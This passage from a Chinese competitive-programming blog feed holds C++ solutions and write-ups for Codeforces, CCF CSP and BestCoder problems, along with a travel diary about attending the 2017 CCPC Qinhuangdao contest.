i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (dp[i][m]&lt;x) &#123;</div><div class="line">                x=dp[y=i][m];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; st;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=m;j&gt;=<span class="number">1</span>;j--) &#123;</div><div class="line">            st.push(y);</div><div class="line">            y=pre[y][j];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">bool</span> fi=<span class="literal">true</span>;</div><div class="line">        <span class="keyword">while</span> (!st.empty()) &#123;</div><div class="line">            <span class="keyword">if</span> (fi) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%d"</span>,st.top());</div><div class="line">                fi=<span class="literal">false</span>;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">" %d"</span>,st.top());</div><div class="line">            &#125;</div><div class="line">            st.pop();</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n%d\n"</span>,x);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="J-DZY-Loves-Sequences"><a href="#J-DZY-Loves-Sequences" class="headerlink" title="J - DZY Loves Sequences"></a><a href="https://vjudge.net/problem/CodeForces-447C" target="_blank" rel="noopener">J - DZY Loves Sequences</a></h3><p>常见类型：扫一遍预处理。分别求出向左和向右最多可以延伸的长度，然后对于每一个$a_i$：</p><ul><li>如果$a_{i-1} + 1 \lt a_{i+1}$，那么$a_i$可以修改为$a_{i-1}$和$a_{i-1}$之间的某个数使得左右两段连接在一起</li><li>如果$a_{i-1} + 1 \ge a_{i+1}$，那么$a_i$只能修改为比$a_{i-1}$大或者比$a_{i-1}$小的数，即左长度加一或者右长度加一</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">int</span> a[N],l[N],r[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,a+i);</div><div class="line">    &#125;</div><div class="line">    l[<span class="number">1</span>]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (a[i<span class="number">-1</span>]&lt;a[i]) l[i]=l[i<span class="number">-1</span>];</div><div class="line">        <span class="keyword">else</span> l[i]=i;</div><div class="line">    &#125;</div><div class="line">    r[n]=n;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=n<span class="number">-1</span>;i;i--) &#123;</div><div class="line">        <span class="keyword">if</span> (a[i]&lt;a[i+<span class="number">1</span>]) r[i]=r[i+<span class="number">1</span>];</div><div class="line">        <span class="keyword">else</span> r[i]=i;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">        l[i]=i-l[i]+<span class="number">1</span>;</div><div class="line">        r[i]=r[i]-i+<span class="number">1</span>;</div><div class="line">        ans=max(ans,max(l[i],r[i]));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (a[i<span class="number">-1</span>]+<span class="number">1</span>&lt;a[i+<span class="number">1</span>]) &#123;</div><div class="line">            ans=max(ans,l[i<span class="number">-1</span>]+<span class="number">1</span>+r[i+<span class="number">1</span>]);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            ans=max(ans,max(l[i<span class="number">-1</span>]+<span class="number">1</span>,r[i+<span class="number">1</span>]+<span class="number">1</span>));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;F-数塔&quot;&gt;&lt;a href=&quot;#F-数塔&quot; class=&quot;headerlink&quot; title=&quot;F - 数塔&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://vjudge.net/problem/HDU-2084&quot; target=&quot;_blank&quot; rel=&quot;noope
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>CSP超级合集</title>
    <link href="https://www.smlight.xyz/2018/01/16/CSP%E8%B6%85%E7%BA%A7%E5%90%88%E9%9B%86/"/>
    <id>https://www.smlight.xyz/2018/01/16/CSP超级合集/</id>
    <published>2018-01-16T04:28:33.000Z</published>
    <updated>2018-03-19T09:15:03.425Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h3><p>听说考得好写在简历里很不错，准备参加三月份的CSP。<br>仅含题解，代码详见<a href="https://github.com/Smlight/CCFCSP" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="201712-1-最小差值"><a href="#201712-1-最小差值" class="headerlink" title="201712-1 最小差值"></a>201712-1 最小差值</h3><p>sb-t。随便暴力一下。</p><h3 id="201712-2-游戏"><a href="#201712-2-游戏" class="headerlink" title="201712-2 游戏"></a>201712-2 游戏</h3><p>sb-t。<strong>BUT，</strong>读题的时候没读到<code>或其末位数（即数的个位）为k</code>，直接当约瑟夫做了。。。<br>最垃圾的做法就是拿数组标记一下，手动控制环。（没错我就是这么做的，写起来还是很快的</p><h3 id="201712-3-Crontab"><a href="#201712-3-Crontab" class="headerlink" title="201712-3 Crontab"></a>201712-3 Crontab</h3><p>还没读完题头都大了，写完第4题的第一稿才开始动手做。题目虽然很长，题意其实还是挺清晰的。<br>核心算法就是模拟，用了一次蔡勒公式算出星期几。输入处理简单来讲的话就是，先按‘ ’（空格）split，每段再按‘,’（逗号）split，每段再按‘-’（减号）split，然后再转换成非负整数标记到这个$crontab$对应的布尔数组，比如周一周二那就是在一周的数组中标记$1$和$2$，详见代码。最后从起始到终止一分钟一分钟往上加，每一分钟都枚举$n$个$crontab$判断一下是否满足。算了一下极限复杂度稍微有点方，不过看了一下输出不超过10000行，应该不会TLE。<br>思考加打代码估计有一个多小时。。。最后交上去一看，85分，难道还是TLE了？结果点进去一看是WA，有点懵逼。又读了一遍题，还是没啥发现。查了查别人代码发现好像英文缩写不区分大小写，然后回到题目里一看，中间有一句确实写着，唉。。。</p><h3 id="201712-4-行车路线"><a href="#201712-4-行车路线" class="headerlink" title="201712-4 行车路线"></a>201712-4 行车路线</h3><p><em>ps.</em> <code>201712-4.cpp</code>是60分代码，<code>201712-4S.cpp</code>是满分代码。<br>其实核心思想跟之前是差不多的。首先因为小道的费用（和的平方）没有可加性，所以就要把小道全都做成$tp$（传送卷轴）：启动$tp$以后可以花费一定的费用从一个点传送到另一个点。其次为了保证小道的费用不可加，要限制$tp$不能连续使用，连续使用时费用缩水（$1^2+1^2&lt;(1+1)^2$）。<br>具体实现是：首先用$Floyd$求出只用小道的任意点对间的距离，把这些距离的平方作为$tp$的费用存下来。然后用$SPFA$求单源最短路，分别用两个数组记录$tp$过来的（$dis1$）和从大道过来的（$dis0$），对于边$u\rightarrow  v$，$tp$到$u$的不能再通过$tp$到$v$，其它的不作限制。最后输出$min(dis0(n),dis1(n))$即可。<br><em>ps.</em> $Floyd+SPFA$有风险，一点不考虑常数优化的话交上去<strong>只有50分</strong>，比$dijkstra$乱搞还低。</p><h3 id="201712-5-商路（60分）"><a href="#201712-5-商路（60分）" class="headerlink" title="201712-5 商路（60分）"></a>201712-5 商路（60分）</h3><p>没剩太多时间，$n^2$直接上，小数据一分没丢。<em>yes!</em></p><h3 id="201712-总结"><a href="#201712-总结" class="headerlink" title="201712 总结"></a>201712 总结</h3><p>最近的一场，比较真实地模拟了一下（最后才一起提交），结果才320分，5个题第2题最低，好SB啊。。。</p><ol><li><strong>仔细读题非常重要！</strong>第2题读对可以多70分，第3题完全读对可以多15分，这样勉强可以上400</li><li><strong>想不到正解要快速把握部分分。</strong>从中学开始就喜欢比赛时先想正解，但是水平又不太行，经常会花大把时间做无用功。第4题大概改写了两三遍，如果一开始就想着先按60分的写，第2/5题分配到的时间就会再多一点。时间一多，分数就有上涨的可能，特别是第2题我还看着$k$的数据范围奇怪了一会儿，最后还是没发现那句话。。。</li></ol><p>这两点说起来容易，其实还是挺有难度的，看来要多加训练了。。。</p><p>=========UPDATE=========<br>好像认证是四个小时，我一直当三个小时练的，应该不会时间太吃紧了。。。</p><h3 id="201709-1-打酱油"><a href="#201709-1-打酱油" class="headerlink" title="201709-1 打酱油"></a>201709-1 打酱油</h3><p>sb-t。随便贪心一下。</p><h3 id="201709-2-公共钥匙盒"><a href="#201709-2-公共钥匙盒" class="headerlink" title="201709-2 公共钥匙盒"></a>201709-2 公共钥匙盒</h3><p>小模拟，核心就是给所有事件排序。</p><h3 id="201709-3-JSON查询"><a href="#201709-3-JSON查询" class="headerlink" title="201709-3 JSON查询"></a>201709-3 JSON查询</h3><p>中等模拟，除了基本的split以外，涉及到了括号匹配的知识，只有同一层的括号它们才有可能组成一个JSON对象。<br>具体来讲，可以一边dfs一边建树，但是传个字符串递归总是很慢的，我的习惯是传一下左右边界。建树的节点都是整数标识，再用额外的数组存一下key-value。然后查询的时候一层一层地查，每层有以下几种情况：</p><ol><li>子节点没有对应的串，一定返回“NOTEXIST”</li><li>子节点有对应的串，查询串没有下一层，要么“STRING”要么“OBJECT”</li><li>子节点有对应的串且是对象，查询串有下一层，继续递归</li><li>子节点有对应的串且是字符串，查询串有下一层，返回“NOTEXIST”</li></ol><p><em>手动处理累手不累脑子</em></p><h3 id="201709-4-通信网络"><a href="#201709-4-通信网络" class="headerlink" title="201709-4 通信网络"></a>201709-4 通信网络</h3><p>刚读完懵逼了，写了一大堆乱七八糟的。。。<br>其实就是原图和反图bfs一下，然后可达点取个并集，是全集就给答案加一。</p><h3 id="201709-5-除法"><a href="#201709-5-除法" class="headerlink" title="201709-5 除法"></a>201709-5 除法</h3><p>50：暴力，每次缩小和求和都扫一遍<br>100：查到几个树状数组的做法，感觉复杂度完全不对，代码放了，正解待定。</p><h3 id="201709-总结"><a href="#201709-总结" class="headerlink" title="201709 总结"></a>201709 总结</h3><p>前4题检查了一遍，第5题打了个暴力，然后啥都不想干就交了，毕竟不是真实考试。。。好在前4题都过了，第5题暴力也很成功。<br><strong>第4题大改，检查很有必要。</strong></p><h3 id="201403-1-相反数"><a href="#201403-1-相反数" class="headerlink" title="201403-1 相反数"></a>201403-1 相反数</h3><p>不会重复，直接取绝对值找出现两次的。</p><h3 id="201312-1-出现次数最多的数"><a href="#201312-1-出现次数最多的数" class="headerlink" title="201312-1 出现次数最多的数"></a>201312-1 出现次数最多的数</h3><p>sb-t。计数随便扫一下。</p><h3 id="201312-2-ISBN号码"><a href="#201312-2-ISBN号码" class="headerlink" title="201312-2 ISBN号码"></a>201312-2 ISBN号码</h3><p>sb-t。随便模拟一下。</p><h3 id="201312-3-最大的矩形"><a href="#201312-3-最大的矩形" class="headerlink" title="201312-3 最大的矩形"></a>201312-3 最大的矩形</h3><p>easy mode：枚举左端点，枚举右端点，顺便维护最小值，乘一下更新一下。<br>medium mode：考虑枚举一个点，并使该点就是区间中最低的，那么就是要求向左向右第一个低于当前点的。这件事情可以用单调栈来搞，正反各一遍。</p><h3 id="201312-4-有趣的数"><a href="#201312-4-有趣的数" class="headerlink" title="201312-4 有趣的数"></a>201312-4 有趣的数</h3><p>一眼看上去想搜索，但是仔细一想。。。是个数学题，稍微懵逼了一会儿，还是要慢慢来，列列式子。<br>因为0都在1之前，也就是说最后一个0在第一个1之前，那么它们可以看作一个整体。又因为每个数字至少出线一次，所以第一个一定是0。23同理。<br>设0和1的总位数是$x$，那么首先要在$n$位中选出$x$位，又因为整个串的第一位不能是0，所以应该是$n-1$位，即$C_{n-1}^{x}$。剩下的$n-x$位分给23。然后在这x位中，只要选一个位置断开，前面是0后面是1即可。枚举最末的0，除了不能在最后都可以（必须有1）。23同理。所以答案等于$C_{n-1}^{x} C_{x-1}^{1} C_{n-x-1}^{1}，2 \le x \le n-2$。$n$小于等于1000，阶乘打表或者组合数打表，随便搞搞。</p><h3 id="201312-5-I’m-stuck"><a href="#201312-5-I’m-stuck" class="headerlink" title="201312-5 I’m stuck!"></a>201312-5 I’m stuck!</h3><p>70：我以为$50^4$肯定能过的。。。直接写了个先起点bfs再每个格子bfs的。。。TLE<br>100：可以直接连边在图上和反图上搜。但是不太想重写，所以加了一个反向搜的函数，注意反向的时候判断的是要到的那个格子的连通方向。</p><h3 id="201312-总结"><a href="#201312-总结" class="headerlink" title="201312 总结"></a>201312 总结</h3><p>作为全系列第一场，非常简单，甚至不需要什么算法知识就能ak。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Before&quot;&gt;&lt;a href=&quot;#Before&quot; class=&quot;headerlink&quot; title=&quot;Before&quot;&gt;&lt;/a&gt;Before&lt;/h3&gt;&lt;p&gt;听说考得好写在简历里很不错，准备参加三月份的CSP。&lt;br&gt;仅含题解，代码详见&lt;a href=&quot;https:
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>2017 CCPC 秦皇岛站游记</title>
    <link href="https://www.smlight.xyz/2017/12/08/2017-qinhuangdao-play/"/>
    <id>https://www.smlight.xyz/2017/12/08/2017-qinhuangdao-play/</id>
    <published>2017-12-08T11:26:33.000Z</published>
    <updated>2018-03-25T02:50:54.601Z</updated>
    
    <content type="html"><![CDATA[<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a><strong>正文</strong></h3><h4 id="BEFORE"><a href="#BEFORE" class="headerlink" title="BEFORE"></a><em>BEFORE</em></h4><p>我校网赛打出来一个名额，教练钦定我们队去。<br>现在都是固定队了，我的队友是 wenwenla 和 jxc 。</p><p>自从听说浙大出题以后，我就一直努力想把zimpha出过的bestcoder都过一遍。<br>【虽然他不出这场但是我感觉题目风格可能有传承？咸鱼的挣扎 ←_←<br>结果发现他出过的bc题实在是太多了。。。于是就按照vj的规格拉了最近的26题练了练。。。非常重视思维，怎么说呢，感觉上没什么套路题，详见<a href="https://smlight.github.io/blog/2017/10/18/zimpha%E7%9A%84bc%E5%87%BA%E9%A2%98%E5%BD%95/" target="_blank" rel="noopener">zimpha的bc出题录</a>。</p><h4 id="Oct-26"><a href="#Oct-26" class="headerlink" title="Oct 26"></a><em>Oct 26</em></h4><p>翻了翻高中通讯录，有一个东秦的同学，非常高兴地问她借了词典~<br>晚上让队友把这个简要题解也都过一遍，然后买了泡面和小香肠啥的第二天吃。</p><h4 id="Oct-27"><a href="#Oct-27" class="headerlink" title="Oct 27"></a><em>Oct 27</em></h4><p>没有老师带队，我们自己坐高铁去，睡睡觉吃吃面看看片，日子过得还是挺开心的。路上感觉河北的污染确实比较严重，然后在高铁上问AA姐姐要了几个口罩2333333<br>下了高铁坐公交，跟wc一路。找到宾馆直接从人家后厨就进去了。。。还好找到了报到的地方，真的发了环卫工人服，一切正常。<br>安顿了一下就是饭点了，出去吃了个酱骨自助，竟然有个烧烤和小锅一体的机器！长见识。<br>吃了很久，筒骨还是蛮油的，差点肉醉[笑cry]<br>很饱的我们于是就想散个步，强行在老虎石公园拍了很多照片【基本看不清啥<br>逛完了出来看到卖手链的，问了问看了看，然后每个人买了个指尖陀螺？？？</p><h4 id="Oct-28"><a href="#Oct-28" class="headerlink" title="Oct 28"></a><em>Oct 28</em></h4><p>早上吃饭，宾馆的实在是没啥想吃的东西，咖啡也不给喝。。。<br>坐主办方的车过去，结果报过到的队啥都不用干。。。<br>然后我们就开始瞎逛，不抱希望地联系了一下同学【因为她说周六早上没空<br>结果我们还没正式开始逛她就回复我啦，而且一下子就找到了我们~<br>她说是参加高数竞赛，然后水了水就出来了hhhhhhh</p><p>中午一不小心就点了个比较重口的菜，不过味道还可以。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;&lt;strong&gt;正文&lt;/strong&gt;&lt;/h3&gt;&lt;h4 id=&quot;BEFORE&quot;&gt;&lt;a href=&quot;#BEFORE&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
      <category term="Life" scheme="https://www.smlight.xyz/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>zimpha的bc出题录（部分）</title>
    <link href="https://www.smlight.xyz/2017/10/18/zimpha-bestcoder/"/>
    <id>https://www.smlight.xyz/2017/10/18/zimpha-bestcoder/</id>
    <published>2017-10-18T13:46:08.000Z</published>
    <updated>2018-08-15T03:03:31.215Z</updated>
    
    <content type="html"><![CDATA[<h3 id="A-GCD-is-Funny"><a href="#A-GCD-is-Funny" class="headerlink" title="A - GCD is Funny"></a><a href="https://vjudge.net/problem/HDU-5902" target="_blank" rel="noopener">A - GCD is Funny</a></h3><p>题意：在黑板上写有$n$个数，每次删掉$a,b,c$三个数并把$d$写两遍，$d$可以是$(a,b),(a,c),(b,c)$。在$n-2$次操作后会留下两个相同的数，输出这个数的所有可能情况。<br>题解：给跪了。。。其实是所有大小超过$1$的子集的$gcd$的集合。。。</p><p>注意点：<strong>值域限制</strong>，说是子集当然不可能直接按子集做，而是利用值域很小这一点标记着做；<strong>gcd下降速度</strong>，两个不一样的数取$gcd$，最大也只能是大数的一半，即<strong>对数级别次</strong>就可以到$1$。</p><h3 id="B-Square-Distance"><a href="#B-Square-Distance" class="headerlink" title="B - Square Distance"></a><a href="https://vjudge.net/problem/HDU-5903" target="_blank" rel="noopener">B - Square Distance</a></h3><p>题意：给一个串$s$，长度为$n$(保证偶数)，输出一个串$t$，要满足：$t$由两个相同的串拼接而成；$s$到$t$的汉明距离恰好为$m$；$t$是所有满足条件的串中字典序最小的。$s,t$均只含小写字母，若$t$不存在输出<code>Impossible</code>。<br>题解：后半段放到前半段综合考虑，用dp可以求出前$i$个字符产生$j$个距离可不可行。因为要输出字典序最小，所以最终的贪心一定是从前往后从小往大，若是直接在这种dp上贪心，会导致最后的距离不一定是$m$。所以这里需要倒着dp，即从第$\frac{n}{2}$个到第$i$个字符产生$j$个距离可不可行。</p><p>注意点：看着很像贪心但是没有具体策略的时候一定要<strong>想一想dp</strong>！不一定只贪心或者只dp，也不一定是用贪心优化dp，像这题就是<strong>在dp得到的表上进行贪心</strong>。</p><h3 id="C-LCIS"><a href="#C-LCIS" class="headerlink" title="C - LCIS"></a><a href="https://vjudge.net/problem/HDU-5904" target="_blank" rel="noopener">C - LCIS</a></h3><p>题意：给出$n$个数的序列$a$和$m$个数的序列$b$，问公共的上升的并且数值连续的子序列的最长长度。<br>题解：对$a$扫一遍得到以$x$结尾的连续值上升子序列的最长长度，同样地对$b$扫一遍，最后枚举结尾是什么数字，取两个结果的较小值更新答案。</p><p>注意点：当对子序列的限制非常强时，很有可能可以<strong>每个序列分开做</strong>，最后再合并到答案。</p><h3 id="D-Black-White-Tree"><a href="#D-Black-White-Tree" class="headerlink" title="D - Black White Tree"></a><a href="https://vjudge.net/problem/HDU-5905" target="_blank" rel="noopener">D - Black White Tree</a></h3><p>题意：$n$个节点的无根树$T$，每个节点是黑色或者白色，求$W = \displaystyle\sum_{a=0}^{n}\sum_{b=0}^{n}{(a+1)(b+1)S(a,b)}$，其中$S(a,b)=1$表示存在一个子树恰好由$a$个白色节点和$b$个黑色节点构成，$S(a,b)=0$表示不存在。$T$的一个子树定义为$T$的一个子图并且是树。<br>题解：对于确定大小的子树，如果可以知道最少以及最多有几个黑色节点，那么答案直接两重循环加一个判断就可以算出来了。所以我们可以进行树形dp求出这个最少和最多。先规定$1$作为根，那么题意中的子树就是规定根以后的连通块，用$f[u][i],g[u][i]$分别表示以$u$为根，大小为$i$时最少和最多的黑色节点数，用$F[i],G[i]$表示连通块大小为$i$时最少和最多的黑色节点数。这个转移直接借助代码来说还更好一点。<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">void dfs(int u,int fa)</div><div class="line">&#123;</div><div class="line">    sz[u]=<span class="number">1</span>;</div><div class="line">    f[u][<span class="number">1</span>]=g[u][<span class="number">1</span>]=s[u]-<span class="string">'0'</span>;</div><div class="line">    for (int v:eg[u]) &#123;</div><div class="line">        if (v==fa) continue;</div><div class="line">        dfs(v,u);</div><div class="line">        for (int i=sz[u];i&gt;=<span class="number">1</span>;i--) &#123;</div><div class="line">            for (int j=<span class="number">1</span>;j&lt;=sz[v];j++) &#123;</div><div class="line">                f[u][i+j]=min(f[u][i+j],f[u][i]+f[v][j]);</div><div class="line">                g[u][i+j]=max(g[u][i+j],g[u][i]+g[v][j]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        sz[u]+=sz[v];</div><div class="line">    &#125;</div><div class="line">    for (int i=<span class="number">1</span>;i&lt;=sz[u];i++) &#123;</div><div class="line">        <span class="symbol">F</span>[i]=min(<span class="symbol">F</span>[i],f[u][i]);</div><div class="line">        <span class="symbol">G</span>[i]=max(<span class="symbol">G</span>[i],g[u][i]);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>每个节点被访问深度次，所以最终的复杂度是$O(n^2)$。</p><p>注意点：<strong>无根树的子树</strong>等价于确定一个根以后的<strong>连通块</strong>。</p><h3 id="F-Aaronson"><a href="#F-Aaronson" class="headerlink" title="F - Aaronson"></a><a href="https://vjudge.net/problem/HDU-5747" target="_blank" rel="noopener">F - Aaronson</a></h3><p>题意：$x_{0}+2x_{1}+4x_{2}+…+2^{m}x_{m}=n$的解是$(x_0,x_1,x_2,…,x_m)$，$x_i \ge 0$，求$\displaystyle\sum_{i=0}^{m} x_i$的最小值，$(0 \le n,m \le 10^9)$。<br>题解：若$m$比较小，特殊处理一下$x_m$，剩下的以及其他的情况都是二进制表示的$1$的个数。</p><h3 id="G-Bellovin"><a href="#G-Bellovin" class="headerlink" title="G - Bellovin"></a><a href="https://vjudge.net/problem/HDU-5748" target="_blank" rel="noopener">G - Bellovin</a></h3><p>题意：长度为$n$的$a$序列，求一个长度也为$n$的$b$序列满足，$a$中以$a_i$结尾的$LIS$长度和$b$中以$b_i$结尾的$LIS$长度相等$(1\le i \le n)$，$b$的字典序最小。<br>题解：因为$b_i$最小是$1$，直接把$a$中以$a_i$结尾的$LIS$长度当作$b_i$即可。</p><h3 id="H-Colmerauer"><a href="#H-Colmerauer" class="headerlink" title="H - Colmerauer"></a><a href="https://vjudge.net/problem/HDU-5749" target="_blank" rel="noopener">H - Colmerauer</a></h3><p>题意：一个矩阵的权值定义为其所含的所有鞍点的值的和，若一个点在列上是唯一最大值，在行上是唯一最小值，则其为鞍点。又在矩阵$M$上定义$S(a,b)$，表示所有大小为$a$行$b$列的子矩阵的权值和。现给出矩阵$M$，求$W = (\displaystyle\sum_{a=1}^{n}\sum_{b=1}^{m}{a \cdot b \cdot S(a,b)}) \text{ mod } 2^{32}$。<br>题解：很容易想到单点贡献。对于矩阵中的每一个点，我们暴力出（或者用单调栈优化一下）它能往上下左右延伸的长度，然后直接贡献即可。</p><p>注意点：左右长度的算式没有理清楚，应该<strong>写出原始的公式再进行化简</strong>。</p><h3 id="I-Dertouzos"><a href="#I-Dertouzos" class="headerlink" title="I - Dertouzos"></a><a href="https://vjudge.net/problem/HDU-5750" target="_blank" rel="noopener">I - Dertouzos</a></h3><p>题意：$n$的真因子是不为$n$的因子。给出$n$和$d$，问有多少小于$n$的数的最大真因子是$d$。<br>题解：即$pd=m\lt n$，显然有</p><ol><li>$p \le \frac{n-1}{d}$；</li><li>$p$必须为质数；【如若不然，则$p$有真因子$q$，$qd$是比$d$更大的$m$的真因子。 </li><li>$p \le c$，其中$c$为$d$的最小质因子。【如若不然，则$\frac{d}{c}\times p$是比$d$更大的$m$的真因子。</li></ol><p>由2，我们先做一遍筛法以及前缀和。再算出1的界，最后用筛出来的质数去算3的界。</p><p>注意点：用筛出来的质数去算3的界会有$O(\sqrt{d})$的复杂度，当$d$很大($\approx 10^{9}$)时会超时，而此时1的界必然比较小，应该<strong>在超过已有的界时及时退出</strong>。</p><h3 id="J-Eades"><a href="#J-Eades" class="headerlink" title="J - Eades"></a><a href="https://vjudge.net/problem/HDU-5751" target="_blank" rel="noopener">J - Eades</a></h3><p>题意：长度为$n$的$a$序列，定义$g(l,r)$为$a_l$到$a_r$的最大值，定义$f(l,r)=\displaystyle\sum_{i=l}^{r}[a_i = g(l,r)]$。求对于所有$1\le k \le n$的$k$分别有多少对$(l,r)$满足$f(l,r)=k$。<br>题解：如果$a_i$要对$f$函数有贡献的话必须是这个区间内最大的，所以首先用单调栈求出往左以及往右第一个大于$a_i$的位置。那么在$L+1…R-1$中，$a_i$这个值将区间分为若干段，朴素的想法是直接枚举左端点和右端点在哪一段上然后累加到答案，但是这样还是$O(n^2)$的<del>【其实处理得好能卡过</del>，不过进一步可以发现具体贡献到哪一个答案其实只跟$j-i$(两个段编号的差)有关，那么把其中一个反过来就是一个卷积形式，可以套一个$fft$。</p><p>注意点：具体细节较多，<strong>想不清楚时一定要耐心&amp;动手模拟一下</strong>。</p><h3 id="K-LCP-Array"><a href="#K-LCP-Array" class="headerlink" title="K - LCP Array"></a><a href="https://vjudge.net/problem/HDU-5635" target="_blank" rel="noopener">K - LCP Array</a></h3><p>题意：$s$是一个$1base$的字符串，记$a_i=lcp(ssuff_i,suff_{i+1})$，$(1 \le i &lt; n)$。现给出$a$序列，问有多少只含小写字母的字符串$s$满足这个序列。<br>题解：若$a_i$不为$0$，那么$s_i…s_{i+a_{i}}$这些字符必须全都相同(手动模拟一下)，由此推出从后往前：$a_i$不为$0$则必须连续地增加，若不满足答案为$0$；$a_i$为$0$则将答案乘上25。</p><h3 id="L-Shortest-Path"><a href="#L-Shortest-Path" class="headerlink" title="L - Shortest Path"></a><a href="https://vjudge.net/problem/HDU-5636" target="_blank" rel="noopener">L - Shortest Path</a></h3><p>题意：$n$个点的无向图，原来在$i$和$i+1$之间有边，现在添加3条边，所有边的权值都是$1$，每次询问$u$到$v$的最短路是多少。<br>题解：实际上就是改变了6个点(或者不到6个)之间的距离，直接Floyd。询问的时候直接暴力枚举穿过哪两个点。</p><p>注意点：不要忘记跟初始的距离取$min$。</p><h3 id="M-Transform"><a href="#M-Transform" class="headerlink" title="M - Transform"></a><a href="https://vjudge.net/problem/HDU-5637" target="_blank" rel="noopener">M - Transform</a></h3><p>题意：给出$n$个数，可以对整数$x$进行两种操作，</p><ol><li>翻转$x$的一个bit；</li><li>$x \leftarrow x\ xor\ a_i$ 。</li></ol><p>每次询问把$S$变成$T$最少需要几步。<br>题解：两个操作都可以归结为$xor$，所以从$S$走到$T$跟从$0$走到$S\ xor\ T$是等价的。直接以$0$为起点按两种操作进行$bfs$，$O(1)$回答。</p><p>注意点：<strong>状态数trick</strong>，虽然每次有几十条边，但是最后询问的范围只有$10^5$左右，最多也就是$0$到$(2^{17}-1)$每个点都走一遍。</p><h3 id="N-Toposort"><a href="#N-Toposort" class="headerlink" title="N - Toposort"></a><a href="https://vjudge.net/problem/HDU-5638" target="_blank" rel="noopener">N - 